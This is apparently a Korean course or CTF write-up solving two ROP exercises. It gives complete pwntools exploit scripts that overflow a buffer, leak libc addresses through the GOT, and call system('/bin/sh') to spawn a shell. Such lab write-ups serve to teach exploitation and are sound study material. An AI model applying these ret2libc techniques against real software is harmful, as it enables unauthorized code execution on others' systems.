# 6주차

## rop1

You can use read, write  
먼저 write 함수를 이용하여 read 함수의 실제 주소를 알아내고, 이를 이용하여 libc_leak을 한다. system 함수와 '/bin/sh'의 주소를 구한 뒤 그것을 실행하도록 한다.  
필요한 gadget은 pop3_ret이다. "You can use read, write" 부분을 받아주도록 해야 한다.


```python
from pwn import *

p = process("./rop1")
e = ELF("./rop1")
libc = e.libc

pop_ret = 0x08049022
pop3_ret = 0x08049381
read_plt = 0x080490b0
read_got = 0x0804bfd4
write_plt = 0x08049100
main = 0x80492ca

p.recvuntil(b"You can use read, write\n")

payload = b'A'*0x40
payload += b'B'*0x4
payload += p32(write_plt)
payload += p32(pop3_ret)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)
payload += p32(main+57)

p.sendline(payload)

read_addr = u32(p.recv(4))

libc_base = read_addr - libc.symbols['read']
system_addr = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search(b'/bin/sh'))[0]

log.info("libc base: "+hex(libc_base))
log.info("read addr: "+hex(read_addr))
log.info("system addr: "+hex(system_addr))
log.info("binsh: "+hex(binsh))

payload = b'A'*0x40
payload += b'B'*0x4
payload += p32(system_addr)
payload += p32(pop_ret)
payload += p32(binsh)

p.send(payload)

p.interactive()

```


## rop2

gets and puts  
gets와 puts를 사용하여 rop를 진행한다. 1번과 다르게 x64환경이므로 pop_rdi 가젯을 사용하여 인자를 전달하고 puts 함수의 주소를 알아낸 뒤 libc leak을 진행하여 system_addr과 binsh를 구하고 payload를 전송하면 된다.

```python
from pwn import *

p = process("./rop2")
e = ELF("./rop2")
libc = e.libc

pop_rdi = 0x00401313
puts_got = 0x403fc0
puts_plt = 0x401090
main = 0x401268 

#p.recvuntil(b"You can use read, write\n")

payload = b'A'*0x40
payload += b'B'*0x8
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main+46)

p.sendline(payload)

puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))

libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search(b'/bin/sh'))[0]

log.info("libc base: "+hex(libc_base))
log.info("system addr: "+hex(system_addr))
log.info("binsh: "+hex(binsh))

payload = b'A'*0x40
payload += b'B'*0x8
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_addr)

p.send(payload)

p.interactive()

```




